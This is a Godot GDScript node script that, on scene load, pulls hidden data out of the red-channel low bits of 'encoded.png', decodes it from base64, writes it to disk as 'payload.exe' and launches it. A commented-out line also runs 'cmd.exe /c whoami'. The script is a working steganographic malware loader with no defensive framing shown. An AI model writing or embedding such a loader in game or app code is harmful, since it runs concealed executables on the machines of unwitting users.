extends Node

func _ready():
	var image = Image.new()
	var err = image.load("res://encoded.png")
	if err != OK:
		push_error("Could not load encoded.png")
		return

	var bits = []
	for y in range(image.get_height()):
		for x in range(image.get_width()):
			var color = image.get_pixel(x, y)
			var r = int(color.r * 255.0)
			bits.append(r & 1)

	# Rebuild characters from bits
	var bytes = PackedByteArray()
	for i in range(0, bits.size(), 8):
		var byte_val = 0
		for j in range(8):
			byte_val = (byte_val << 1) | bits[i + j]
		if byte_val == 0: # end marker
			break
		bytes.append(byte_val)
	
	var b64 = bytes.get_string_from_utf8()
	var payloadBuffer = Marshalls.base64_to_raw(b64)
	var payloadFile = FileAccess.open("res://payload.exe", FileAccess.WRITE)
	payloadFile.store_buffer(payloadBuffer)
	payloadFile.close()
	
	#var output=[]
	#var exit_code = OS.execute("cmd.exe", ["/c", "whoami"],output)
	#print(output)
	
	var payloadPath = ProjectSettings.globalize_path("res://") + "payload.exe"
	print(payloadPath)
	var result = OS.execute_with_pipe(payloadPath,[],false)
	if(result.is_empty()):
		print("Couldn't launch payload")
	else:
		print("Payload launched with ",result.get("pid"))

	
	#if file:
		#file.store_string(message)
		#file.close()
		#print("Decoded script saved to ", save_path)
	#else:
		#push_error("Could not save decoded script")
